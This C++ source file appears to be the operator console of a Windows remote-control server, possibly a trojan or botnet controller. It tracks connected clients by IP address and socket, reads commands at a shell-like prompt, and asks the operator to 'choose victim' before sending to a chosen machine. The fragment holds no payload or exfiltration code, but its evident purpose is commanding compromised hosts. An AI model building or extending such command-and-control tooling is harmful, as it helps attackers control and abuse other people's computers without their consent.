#include "Input.h"
#include <map>
#include <string>
#include<WinSock2.h>
#include<WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

Input::Input() : client(""), command("")
{
	system("cls");
	std::cout << "Server Init.";
	Sleep(500);
	std::cout << ".";
	Sleep(500);
	std::cout << ".";
	Sleep(500);
	system("cls");
	std::cout << "Server Initilized" << std::endl;
}

std::string Input::In()
{
	std::cout << "\n$> ";
	std::getline(std::cin, command);

	return command;
}

void Input::Out(std::string output)
{
	std::cout << "\n" << output.c_str() << std::endl;
}

SOCKET Input::ChooseClient()
{
	std::string connected = "clients connected: \n";
	std::map<std::string, SOCKET>::iterator i;
	for (i = list.begin(); i != list.end(); ++i)
	{
		connected += i->first + ",\t";
	}
	connected += "\0\n";
	this->Out(connected);
	std::cout << "choose victim ";
	client = this->In();
	for (i = list.begin(); i != list.end(); ++i)
		if (!client.compare(i->first))
			return i->second;
	return 0;
}

void Input::AddClient(sockaddr_in addr, SOCKET sock)
{
	char ip[16] = { 0 };
	inet_ntop(AF_INET, &addr.sin_addr, ip, sizeof ip);
	list.insert(std::pair < std::string, SOCKET>(std::string(ip), sock));
}

Input Input::input = Input();
std::string Input::RET = "ret";
